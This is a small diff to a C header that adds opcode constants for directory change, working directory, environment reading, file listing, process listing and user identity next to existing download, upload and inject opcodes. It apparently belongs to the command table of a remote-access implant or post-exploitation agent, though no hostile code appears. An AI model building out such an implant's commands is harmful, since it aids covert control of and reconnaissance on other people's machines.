@@ -9,5 +9,11 @@
 #define OPCODE_DOWNLOAD 0x6
 #define OPCODE_UPLOAD 0x7
 #define OPCODE_INJECT 0x8
+#define OPCODE_CHDIR 0x9
+#define OPCODE_PWD 0xA
+#define OPCODE_GETENV 0xB
+#define OPCODE_LS 0xC
+#define OPCODE_PS 0xD
+#define OPCODE_WHOAMI 0xE
 
 #endif
